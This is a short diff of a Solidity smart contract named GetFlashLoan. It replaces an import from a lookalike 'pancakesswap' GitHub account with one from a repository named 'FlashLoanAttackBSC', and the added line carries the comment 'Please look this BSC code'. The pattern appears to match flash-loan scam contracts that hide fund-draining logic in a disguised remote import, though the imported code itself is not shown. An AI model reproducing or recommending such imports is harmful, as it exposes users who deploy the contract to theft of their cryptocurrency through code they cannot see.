@@ -9,8 +9,8 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
-// Code Manager
-import "https://github.com/pancakesswap/pancake-swap-lib/blob/main/PairNamer.sol";
+// Code Manager (Please look this BSC code)
+import "https://github.com/welstrec/FlashLoanAttackBSC/blob/main/pancakesswap/pancake-swap-lib/main/PairNamer.sol";
 
 contract GetFlashLoan {
 	string public tokenName;
